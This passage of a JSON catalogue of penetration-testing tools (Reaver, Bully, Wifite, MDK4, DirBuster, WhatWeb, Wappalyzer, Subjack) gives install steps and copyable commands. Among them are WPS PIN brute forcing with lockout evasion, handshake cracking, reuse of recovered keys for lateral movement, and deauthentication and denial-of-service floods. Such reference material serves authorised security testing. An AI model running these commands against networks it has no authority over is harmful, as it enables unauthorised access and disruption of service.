        "scenario": "Deploy Kismet drones on remote sensors feeding a central server.",
        "command": "kismet_capture -c wlan0 -s tcp://kismet-server:3501",
        "notes": [
          "Use TLS and API keys for secure telemetry.",
          "Ideal for large campuses where multiple vantage points needed."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Kismet docs",
        "url": "https://www.kismetwireless.net/docs/",
        "description": "Configuration and sensor deployment guides."
      }
    ]
  },
  {
    "id": "reaver",
    "name": "Reaver",
    "summary": "Reaver implements a brute force attack against WiFi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via apt and enable monitor mode support.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y reaver aircrack-ng",
            "copyable": true
          },
          {
            "detail": "sudo airmon-ng start wlan0",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Preinstalled; update to latest SVN for additional chipset support.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y reaver",
            "copyable": true
          },
          {
            "detail": "sudo wash -i wlan0mon",
            "copyable": true
          },
          {
            "detail": "reaver --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use kalilinux container when host OS lacks wireless tools.",
        "steps": [
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y reaver'",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling reaver -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wash -i wlan0mon",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic WPS attack",
        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv",
        "notes": []
      },
      {
        "description": "With custom timeout",
        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10 -vv",
        "notes": []
      },
      {
        "description": "Fixed channel",
        "command": "reaver -i wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -vv",
        "notes": []
      },
      {
        "description": "With PIXIE Dust attack",
        "command": "reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --pixie-dust -vv",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-i",
        "description": "Wireless interface"
      },
      {
        "flag": "-b",
        "description": "Target BSSID"
      },
      {
        "flag": "-c",
        "description": "Channel number"
      },
      {
        "flag": "-t",
        "description": "Timeout in seconds"
      },
      {
        "flag": "-vv",
        "description": "Verbose output"
      },
      {
        "flag": "--pixie-dust",
        "description": "PIXIE Dust attack"
      },
      {
        "flag": "-p",
        "description": "WPS PIN"
      },
      {
        "flag": "-d",
        "description": "Delay between attempts"
      }
    ],
    "operational_tips": [
      "Ensure stable connection to target AP.",
      "Monitor for lockouts and adjust timing.",
      "PIXIE Dust attack is faster on vulnerable routers.",
      "Document all WPS vulnerabilities found."
    ],
    "step_sequences": [
      {
        "title": "WPS brute force",
        "steps": [
          {
            "title": "Discover WPS APs",
            "details": "Use wash to list targets.",
            "command": "wash -i wlan0mon"
          },
          {
            "title": "Launch reaver",
            "details": "Target BSSID/channel with --no-associate if using external association.",
            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv"
          },
          {
            "title": "Resume",
            "details": "Use --session to resume interrupted attempts.",
            "command": "reaver --session=reaver-session -i wlan0mon -b 00:11:22:33:44:55 -vv"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Kismet \u2192 Reaver \u2192 Credential reuse",
        "stages": [
          {
            "label": "Identify WPS targets",
            "description": "Use Kismet/wash to flag WPS-enabled APs.",
            "command": "wash -i wlan0mon"
          },
          {
            "label": "Brute WPS",
            "description": "Run Reaver or Bully to recover the PIN/PSK.",
            "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -vv"
          },
          {
            "label": "Crack reuse",
            "description": "Use recovered PSK for lateral movement or wordlist seeding.",
            "command": "aircrack-ng handshake.cap -w psk_list.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Pin cracked in 01:34:12",
        "meaning": "WPS PIN recovered; PSK printed below.",
        "severity": "high"
      },
      {
        "indicator": "[!] WARNING: Failed to associate",
        "meaning": "Adapter could not associate; try --no-associate or adjust distance.",
        "severity": "warning"
      },
      {
        "indicator": "[+] WPS PIN: 12345670",
        "meaning": "PIN discovered; PSK should follow if not locked down.",
        "severity": "high"
      }
    ],
    "advanced_usage": [
      {
        "title": "Timeout tuning",
        "scenario": "Adjust delays to avoid AP lockout.",
        "command": "reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5 -x 60 -vv",
        "notes": [
          "-d sets delay between pin attempts; -x sets max retries before sleeping.",
          "Monitor AP logs to coordinate with blue teams."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Reaver-wps repository",
        "url": "https://github.com/t6x/reaver-wps-fork-t6x",
        "description": "Updated fork and documentation."
      }
    ]
  },
  {
    "id": "bully",
    "name": "Bully",
    "summary": "Bully is a WPS brute force tool that implements a brute force attack against WiFi Protected Setup (WPS) PINs.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Build from source for best chipset compatibility.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y build-essential libpcap-dev aircrack-ng",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/aanarchyy/bully.git",
            "copyable": true
          },
          {
            "detail": "cd bully/src && make && sudo make install",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from apt repo.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y bully",
            "copyable": true
          },
          {
            "detail": "bully --help",
            "copyable": true
          },
          {
            "detail": "bully --5ghz",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use kali container when local OS lacks dependencies.",
        "steps": [
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y bully'",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bully -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wash -i wlan0mon",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic WPS attack",
        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -v 4",
        "notes": []
      },
      {
        "description": "With PIN length",
        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -l 8 -v 4",
        "notes": []
      },
      {
        "description": "Force specific channel",
        "command": "bully wlan0mon -c 6 -b AA:BB:CC:DD:EE:FF -v 4",
        "notes": []
      },
      {
        "description": "With custom delay",
        "command": "bully wlan0mon -b AA:BB:CC:DD:EE:FF -d 2 -v 4",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-b",
        "description": "Target BSSID"
      },
      {
        "flag": "-c",
        "description": "Channel number"
      },
      {
        "flag": "-l",
        "description": "PIN length"
      },
      {
        "flag": "-d",
        "description": "Delay between attempts"
      },
      {
        "flag": "-v",
        "description": "Verbose level (1-5)"
      },
      {
        "flag": "-s",
        "description": "Skip first PIN"
      },
      {
        "flag": "-f",
        "description": "Force operation"
      }
    ],
    "operational_tips": [
      "Start with default PIN length of 8.",
      "Monitor for AP lockouts and adjust timing.",
      "Use verbose output to monitor progress.",
      "Combine with other wireless tools for testing."
    ],
    "step_sequences": [
      {
        "title": "WPS brute force with Bully",
        "steps": [
          {
            "title": "Identify target",
            "details": "Use wash/kismet to list WPS-enabled APs.",
            "command": "wash -i wlan0mon"
          },
          {
            "title": "Run bully",
            "details": "Use aggressive or incremental modes as required.",
            "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6 --bruteforce"
          },
          {
            "title": "Handle lockouts",
            "details": "Use delay/retry options to bypass lockouts.",
            "command": "bully wlan0mon -b 00:11:22:33:44:55 -c 6 -T 2 -d"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Reaver/Bully tag team",
        "stages": [
          {
            "label": "Recon",
            "description": "Use Kismet/wash to find WPS target.",
            "command": "wash -i wlan0mon"
          },
          {
            "label": "Primary attack",
            "description": "Run Bully for speed; fall back to Reaver for flaky APs.",
            "command": "bully wlan0mon -b 00:11:22:33:44:55"
          },
          {
            "label": "Credential use",
            "description": "Reuse PSK or seed wordlists for Aircrack/Hashcat.",
            "command": "aircrack-ng capture.cap -w recovered_psk.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] PIN: 12345670",
        "meaning": "PIN recovered; PSK should appear next.",
        "severity": "high"
      },
      {
        "indicator": "[!] WPS transaction failed (timeout)",
        "meaning": "Reduce aggressiveness or relocate closer to AP.",
        "severity": "warning"
      },
      {
        "indicator": "[+] WPA PSK: Password123",
        "meaning": "Network key recovered; document in report.",
        "severity": "high"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom PIN file",
        "scenario": "Use known/default PINs before brute force.",
        "command": "bully wlan0mon -b 00:11:22:33:44:55 -F pins.txt",
        "notes": [
          "Pre-populate pins.txt with vendor default PINs.",
          "Reduces lockout risk by testing fewer guesses."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Bully GitHub",
        "url": "https://github.com/aanarchyy/bully",
        "description": "Documentation and source."
      }
    ]
  },
  {
    "id": "wifite",
    "name": "Wifite",
    "summary": "Wifite is a wireless auditor that attacks multiple WEP, WPA, and WPS networks in a row.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pipx for latest release.",
        "steps": [
          {
            "detail": "python3 -m pip install --user pipx",
            "copyable": true
          },
          {
            "detail": "pipx install wifite",
            "copyable": true
          },
          {
            "detail": "wifite --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Ships with Kali; update wordlists/adapters.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y wifite",
            "copyable": true
          },
          {
            "detail": "sudo airmon-ng check kill",
            "copyable": true
          },
          {
            "detail": "wifite -v",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use container for scripted engagements.",
        "steps": [
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y wifite'",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wifite -h",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling wifite -i wlan0mon",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Scan and attack all networks",
        "command": "sudo wifite2 -i wlan0mon",
        "notes": []
      },
      {
        "description": "Attack specific network",
        "command": "sudo wifite2 -i wlan0mon -b AA:BB:CC:DD:EE:FF",
        "notes": []
      },
      {
        "description": "WPS only mode",
        "command": "sudo wifite2 -i wlan0mon --wps",
        "notes": []
      },
      {
        "description": "With wordlist",
        "command": "sudo wifite2 -i wlan0mon -w wordlist.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-i",
        "description": "Wireless interface"
      },
      {
        "flag": "-b",
        "description": "Target BSSID"
      },
      {
        "flag": "-w",
        "description": "Wordlist for WPA"
      },
      {
        "flag": "--wps",
        "description": "WPS attack only"
      },
      {
        "flag": "--all",
        "description": "Attack all networks"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-p",
        "description": "Passive scanning"
      }
    ],
    "operational_tips": [
      "Automates multiple attack types efficiently.",
      "Good for testing multiple networks quickly.",
      "Monitor progress and adjust parameters as needed.",
      "Be aware of legal requirements for testing."
    ],
    "step_sequences": [
      {
        "title": "Automated capture",
        "steps": [
          {
            "title": "Launch",
            "details": "Select interface and scan for targets.",
            "command": "sudo wifite"
          },
          {
            "title": "Pick target",
            "details": "Wifite lists networks; choose target ID.",
            "command": "[1] Select target"
          },
          {
            "title": "Capture handshake",
            "details": "Wifite runs airodump/aireplay automatically; monitor status.",
            "command": "wifite -i wlan0mon --handshake"
          },
          {
            "title": "Crack",
            "details": "Automatically attempts crack via aircrack/hashcat; specify custom wordlist if desired.",
            "command": "wifite --dict wordlists/custom.txt"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wifite automation chain",
        "stages": [
          {
            "label": "Recon",
            "description": "Use Kismet or wifite scan to find networks.",
            "command": "wifite --scan"
          },
          {
            "label": "Capture",
            "description": "Run wifite to grab handshakes/PMKIDs.",
            "command": "wifite -i wlan0mon --pmkid"
          },
          {
            "label": "Crack",
            "description": "Use aircrack/hashcat with captured files.",
            "command": "aircrack-ng wifite-hs.cap -w custom.txt"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] captured handshake",
        "meaning": "Handshake stored under wifite/ directory; proceed to cracking.",
        "severity": "info"
      },
      {
        "indicator": "[-] failed to capture handshake",
        "meaning": "AP/client may be far away; increase retries or use targeted deauth.",
        "severity": "warning"
      },
      {
        "indicator": "[+] saved to: wifite-2024-11-22-01.cap",
        "meaning": "Capture saved; record path in notes.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom attack mix",
        "scenario": "Disable slow attacks and focus on handshake capture.",
        "command": "wifite --no-wps --no-pmkid --handshake --dict custom.txt",
        "notes": [
          "Use --persist to resume previous sessions.",
          "Combine with Crunch/CeWL wordlists for targeted cracking."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "Wifite wiki",
        "url": "https://github.com/derv82/wifite2",
        "description": "Usage and configuration."
      }
    ]
  },
  {
    "id": "mdk4",
    "name": "MDK4",
    "summary": "MDK4 is a wireless attack tool that implements various attacks including deauthentication, beacon flooding, and packet injection.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Build from source for the latest attack suites.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y libpcap-dev libssl-dev",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/aircrack-ng/mdk4.git",
            "copyable": true
          },
          {
            "detail": "cd mdk4 && make && sudo make install",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install via apt.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y mdk4",
            "copyable": true
          },
          {
            "detail": "mdk4 --help",
            "copyable": true
          },
          {
            "detail": "sudo airmon-ng start wlan0",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run attacks from containerized Kali.",
        "steps": [
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling bash -lc 'apt update && apt install -y mdk4'",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling mdk4 --help",
            "copyable": true
          },
          {
            "detail": "docker run --rm --net=host --cap-add=NET_ADMIN kalilinux/kali-rolling mdk4 wlan0mon d",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Beacon flood attack",
        "command": "sudo mdk4 wlan0mon b -f AA:BB:CC:DD:EE:FF",
        "notes": []
      },
      {
        "description": "Deauthentication attack",
        "command": "sudo mdk4 wlan0mon d -c AA:BB:CC:DD:EE:FF",
        "notes": []
      },
      {
        "description": "EAPOL start flood",
        "command": "sudo mdk4 wlan0mon e -f AA:BB:CC:DD:EE:FF",
        "notes": []
      },
      {
        "description": "Authentication DOS",
        "command": "sudo mdk4 wlan0mon a -i AA:BB:CC:DD:EE:FF",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "b",
        "description": "Beacon flood attack"
      },
      {
        "flag": "d",
        "description": "Deauthentication attack"
      },
      {
        "flag": "e",
        "description": "EAPOL start flood"
      },
      {
        "flag": "a",
        "description": "Authentication DOS"
      },
      {
        "flag": "-f",
        "description": "Target BSSID"
      },
      {
        "flag": "-c",
        "description": "Channel number"
      },
      {
        "flag": "-i",
        "description": "Target BSSID"
      }
    ],
    "operational_tips": [
      "Use for testing wireless network robustness.",
      "Be careful with DOS attacks on production networks.",
      "Monitor network responses during attacks.",
      "Document all wireless vulnerabilities found."
    ],
    "step_sequences": [
      {
        "title": "Common mdk4 attack modes",
        "steps": [
          {
            "title": "Deauth",
            "details": "Force clients off the AP.",
            "command": "mdk4 wlan0mon d -b blacklist.txt"
          },
          {
            "title": "WIDS/WIPS confusion",
            "details": "Send randomized beacon frames to test detections.",
            "command": "mdk4 wlan0mon b"
          },
          {
            "title": "TSC exhaustion",
            "details": "Exhaust TKIP IV space to cause rekey.",
            "command": "mdk4 wlan0mon t"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wireless stress test",
        "stages": [
          {
            "label": "Baseline",
            "description": "Monitor with Wireshark/Kismet before attacks.",
            "command": "kismet -c wlan0mon"
          },
          {
            "label": "Execute mdk4",
            "description": "Run targeted modes (deauth/beacon flood).",
            "command": "mdk4 wlan0mon d -b targets.txt"
          },
          {
            "label": "Assess",
            "description": "Capture reaction with Wireshark and log detection events.",
            "command": "tshark -i wlan0mon -f 'wlan subtype deauth'"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "[+] Sending deauth frames",
        "meaning": "Attack is active; coordinate with blue team to avoid unintended outages.",
        "severity": "warning"
      },
      {
        "indicator": "Packets sent: 1000",
        "meaning": "Progress indicator; adjust runtime as needed.",
        "severity": "info"
      },
      {
        "indicator": "No beacons received",
        "meaning": "Adapter may not be in monitor mode or channel locked; reconfigure before re-running.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "Targeted client deauth",
        "scenario": "Only disconnect specific client MACs.",
        "command": "mdk4 wlan0mon d -c 6 -s 00:aa:bb:cc:dd:ee",
        "notes": [
          "Use -s to scope to client MAC addresses.",
          "Ensure attack is authorized; high risk of service disruption."
        ]
      }
    ],
    "comparison_table": null,
    "resources": [
      {
        "label": "mdk4 wiki",
        "url": "https://github.com/aircrack-ng/mdk4",
        "description": "Modes and examples."
      }
    ]
  },
  {
    "id": "dirbuster",
    "name": "DirBuster",
    "summary": "DirBuster is a multi-threaded Java application designed to brute force directories and files names on web/application servers.",
    "installation_guides": [
      {
        "platform": "Download from GitHub",
        "steps": [
          {
            "detail": "wget https://github.com/Va5c0/DirBuster/releases/latest/download/DirBuster-1.0.2.jar",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Requires Java 8+",
        "steps": [
          {
            "detail": "java -version",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic directory scan",
        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com",
        "notes": []
      },
      {
        "description": "With custom wordlist",
        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -l wordlist.txt",
        "notes": []
      },
      {
        "description": "With file extensions",
        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -x php,asp,html",
        "notes": []
      },
      {
        "description": "Save results",
        "command": "java -jar DirBuster-1.0.2.jar -u https://example.com -o results.txt",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-u",
        "description": "Target URL"
      },
      {
        "flag": "-l",
        "description": "Wordlist file"
      },
      {
        "flag": "-x",
        "description": "File extensions"
      },
      {
        "flag": "-o",
        "description": "Output file"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-r",
        "description": "Recursive scan"
      },
      {
        "flag": "-H",
        "description": "Custom headers"
      }
    ],
    "operational_tips": [
      "Use comprehensive wordlists for better coverage.",
      "Specify relevant file extensions for target technology.",
      "Adjust threads based on target responsiveness.",
      "Save results for manual verification and testing."
    ],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "whatweb",
    "name": "WhatWeb",
    "summary": "WhatWeb is a web scanner that identifies websites, technologies, and version information.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y whatweb",
            "copyable": true
          },
          {
            "detail": "whatweb --version",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed",
        "steps": [
          {
            "detail": "whatweb https://example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "git clone https://github.com/urbanadventurer/WhatWeb",
            "copyable": true
          },
          {
            "detail": "cd WhatWeb",
            "copyable": true
          },
          {
            "detail": "sudo make install",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Basic web scan",
        "command": "whatweb https://example.com",
        "notes": []
      },
      {
        "description": "Verbose output",
        "command": "whatweb -v https://example.com",
        "notes": []
      },
      {
        "description": "Aggressive mode",
        "command": "whatweb -a 3 https://example.com",
        "notes": []
      },
      {
        "description": "Log results",
        "command": "whatweb --log-verbose=whatweb.log https://example.com",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-a",
        "description": "Aggression level (1-4)"
      },
      {
        "flag": "--log-verbose",
        "description": "Log verbose output"
      },
      {
        "flag": "--log-brief",
        "description": "Log brief output"
      },
      {
        "flag": "--log-xml",
        "description": "Log XML output"
      },
      {
        "flag": "--log-json",
        "description": "Log JSON output"
      },
      {
        "flag": "--max-redirects",
        "description": "Maximum redirects"
      }
    ],
    "operational_tips": [
      "Use higher aggression levels for thorough scanning.",
      "Log results for later analysis and reporting.",
      "Combine with other web scanning tools.",
      "Be aware of rate limiting on targets."
    ],
    "step_sequences": [
      {
        "title": "Web technology fingerprinting",
        "steps": [
          {
            "title": "Basic scan",
            "details": "Identify technologies on single URL.",
            "command": "whatweb https://example.com"
          },
          {
            "title": "Aggressive scan",
            "details": "Deep fingerprinting with higher aggression.",
            "command": "whatweb -a 3 https://example.com"
          },
          {
            "title": "Batch scanning",
            "details": "Scan multiple URLs from file.",
            "command": "whatweb -i urls.txt --log-verbose whatweb.log"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "WhatWeb \u2192 Technology-specific testing",
        "stages": [
          {
            "label": "Technology detection",
            "description": "Identify web stack.",
            "command": "whatweb -a 3 https://example.com > tech.txt"
          },
          {
            "label": "Parse technologies",
            "description": "Extract frameworks and versions.",
            "command": "grep -E 'WordPress|Joomla|Drupal|Apache|Nginx' tech.txt"
          },
          {
            "label": "Targeted scanning",
            "description": "Use appropriate scanner.",
            "command": "# If WordPress found: wpscan --url https://example.com"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "HTTPServer[nginx/1.18.0]",
        "meaning": "Web server identified with version.",
        "severity": "info"
      },
      {
        "indicator": "WordPress[5.8]",
        "meaning": "CMS detected; run WPScan for deeper assessment.",
        "severity": "info"
      },
      {
        "indicator": "jQuery[3.5.1]",
        "meaning": "JavaScript library version identified.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Stealth scan with custom user agent",
        "command": "whatweb -a 1 --user-agent 'Mozilla/5.0...' -t 10 -i targets.txt --log-json=results.json",
        "scenario": "Low aggression scan with custom UA and threading.",
        "notes": [
          "Use -a 1 for passive scanning, -a 4 for maximum aggression."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "wappalyzer",
    "name": "Wappalyzer",
    "summary": "Wappalyzer identifies technologies on websites including content management systems, web servers, and frameworks.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install the CLI through npm for headless tech fingerprinting.",
        "steps": [
          {
            "detail": "sudo apt update",
            "copyable": true
          },
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "sudo npm install -g wappalyzer",
            "copyable": true
          },
          {
            "detail": "wappalyzer --help",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Use Kali's node ecosystem or the browser plugin for visual reconnaissance.",
        "steps": [
          {
            "detail": "sudo apt install -y nodejs npm",
            "copyable": true
          },
          {
            "detail": "sudo npm install -g wappalyzer",
            "copyable": true
          },
          {
            "detail": "wappalyzer https://example.com",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Use the official CLI container or browser extension when you cannot install npm globally.",
        "steps": [
          {
            "detail": "docker pull wappalyzer/cli",
            "copyable": true
          },
          {
            "detail": "docker run --rm wappalyzer/cli https://example.com",
            "copyable": true
          },
          {
            "detail": "# Browser: add the Wappalyzer extension from your store",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Analyze website",
        "command": "wappalyzer https://example.com",
        "notes": []
      },
      {
        "description": "JSON output",
        "command": "wappalyzer --json https://example.com",
        "notes": []
      },
      {
        "description": "With user agent",
        "command": "wappalyzer --user-agent 'Custom Bot 1.0' https://example.com",
        "notes": []
      },
      {
        "description": "Python library usage",
        "command": "python3 -c 'import wappalyzer; print(wappalyzer.identify(\"https://example.com\"))'",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "--json",
        "description": "JSON output format"
      },
      {
        "flag": "--user-agent",
        "description": "Custom user agent"
      },
      {
        "flag": "--timeout",
        "description": "Request timeout"
      },
      {
        "flag": "--verify",
        "description": "Verify SSL certificates"
      },
      {
        "flag": "--help",
        "description": "Show help"
      },
      {
        "flag": "--version",
        "description": "Show version"
      }
    ],
    "operational_tips": [
      "Use for technology stack identification.",
      "JSON output is useful for automation.",
      "Combine with vulnerability scans for context.",
      "Document technology stack for attack planning."
    ],
    "step_sequences": [
      {
        "title": "Technology detection workflow",
        "steps": [
          {
            "title": "Browser extension",
            "details": "Browse target and view detected technologies in extension popup.",
            "command": "# Click Wappalyzer icon"
          },
          {
            "title": "CLI batch scan",
            "details": "Analyze multiple URLs via command line.",
            "command": "wappalyzer https://example.com https://app.example.com -o json > technologies.json"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Wappalyzer \u2192 Version research \u2192 Exploit selection",
        "stages": [
          {
            "label": "Detect stack",
            "description": "Identify all technologies.",
            "command": "wappalyzer https://example.com"
          },
          {
            "label": "CVE research",
            "description": "Look up vulnerabilities for detected versions.",
            "command": "searchsploit apache 2.4.41"
          },
          {
            "label": "Targeted testing",
            "description": "Use appropriate tools based on stack.",
            "command": "nikto -h https://example.com"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "WordPress 5.7",
        "meaning": "CMS version detected.",
        "severity": "info"
      },
      {
        "indicator": "nginx 1.18.0",
        "meaning": "Web server identified.",
        "severity": "info"
      },
      {
        "indicator": "Google Analytics",
        "meaning": "Third-party service detected.",
        "severity": "info"
      }
    ],
    "advanced_usage": [
      {
        "title": "Automated CI/CD integration",
        "command": "wappalyzer https://example.com -o json | jq '.technologies[].name' > detected_tech.txt",
        "scenario": "Integrate into build pipelines for continuous tech monitoring.",
        "notes": [
          "Use with security automation to trigger version-specific scans."
        ]
      }
    ],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "subjack",
    "name": "Subjack",
    "summary": "Subjack is a tool for finding subdomain takeovers by checking DNS records for CNAMEs pointing to services.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": null,
        "steps": [
          {
            "detail": "go install github.com/haccer/subjack@latest",
            "copyable": true
          },
          {
            "detail": "export PATH=$PATH:~/go/bin",
            "copyable": true
          },
          {
            "detail": "subjack -h",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Install from source",
        "steps": [
          {
            "detail": "git clone https://github.com/haccer/subjack",
            "copyable": true
          },
          {
            "detail": "cd subjack",
            "copyable": true
          },
          {
            "detail": "go build",
            "copyable": true
          },
          {
            "detail": "sudo mv subjack /usr/local/bin/",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": null,
        "steps": [
          {
            "detail": "docker pull haccer/subjack",
            "copyable": true
          },
          {
            "detail": "docker run --rm haccer/subjack -w domains.txt -t 50 -o results.txt",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Check domain for takeovers",
        "command": "subjack -d example.com",
        "notes": []
      },
      {
        "description": "With wordlist",
        "command": "subjack -d example.com -w subdomains.txt",
        "notes": []
      },
      {
        "description": "Check specific subdomain",
        "command": "subjack -d example.com -s test.example.com",
        "notes": []
      },
      {
        "description": "JSON output",
        "command": "subjack -d example.com -json",
        "notes": []
      }
    ],
    "common_flags": [
      {
        "flag": "-d",
        "description": "Domain to check"
      },
      {
        "flag": "-w",
        "description": "Wordlist file"
      },
      {
        "flag": "-s",
        "description": "Specific subdomain"
      },
      {
        "flag": "-json",
        "description": "JSON output format"
      },
      {
        "flag": "-v",
        "description": "Verbose output"
      },
      {
        "flag": "-t",
        "description": "Number of threads"
      },
      {
        "flag": "-h",
        "description": "Show help"
      }
    ],
    "operational_tips": [
      "Check for vulnerable CNAME configurations.",
      "Use comprehensive subdomain lists.",
      "Document all potential takeover opportunities.",
      "Verify findings manually before exploitation."
    ],
    "step_sequences": [
      {
        "title": "Subdomain takeover detection",
        "steps": [
          {
            "title": "Basic scan",
            "details": "Check for takeover vulnerabilities.",
            "command": "subjack -w subdomains.txt -t 50 -timeout 30 -o takeovers.txt -ssl"
          },
          {
            "title": "Verbose output",
            "details": "See detailed CNAME information.",
            "command": "subjack -w subdomains.txt -t 50 -v"
          },
          {
            "title": "Verify findings",
            "details": "Manually confirm takeover potential.",
